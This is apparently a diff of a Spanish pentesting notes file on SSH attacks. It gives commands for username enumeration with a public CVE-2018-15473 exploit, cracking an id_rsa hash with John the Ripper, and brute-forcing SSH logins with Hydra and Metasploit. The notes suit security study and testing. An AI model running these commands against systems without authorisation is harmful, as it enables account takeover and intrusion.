@@ -1,17 +1,16 @@
-### Enumerar usuarios con SSH
 
-En versiones entre la 2.3 y 7.7 de OpenSSH se pueden enumerar usuarios válidos del sistema con el siguiente [exploit SSH-Username-Enumeration CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473)
 
-Se clona el repositorio, se instala con
-```bash
-pip3 install -r requirements.txt
+### Enumerar SSH (V2.3-7.7)
+ [exploit SSH-Username-Enumeration CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473)
+
 ```
+#1 clonar repositorio y luego:
+pip3 install -r requirements.txt
 
-se lanza:
-
-```bash
+#2 Lanzar exploit
 ./CVE-2018-15473.py <ip> -u <username_dictionary>
 ```
+
 ### Fuerza bruta id_rsa hash SSH
 
 Teniendo el fichero id_rsa, podemos intentar crackearlo por fuerza bruta. Para ello primero debemos pasarlo a un formato que entienda john the ripper:
@@ -25,6 +24,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ### Fuerza bruta servicio SSH
+#### Hydra
 Si la "l" o "p" son minúsculas, le estamos indicando que utilice literalmente dicho usuario o contraseña. Si es mayúscula, lo utilizaremos para tirar de un diccionario.
 ```bash
 hydra ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt -f -vV 
@@ -34,7 +34,7 @@ hydra -t 64 ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt
 
 ```
 
-### Fuerza bruta servicio SSH con Metasploit
+#### Metasploit
 ```bash
 # search ssh_login, utilizaremos auxiliary/scanner/ssh/ssh_login
 Completamos los datos y "run"
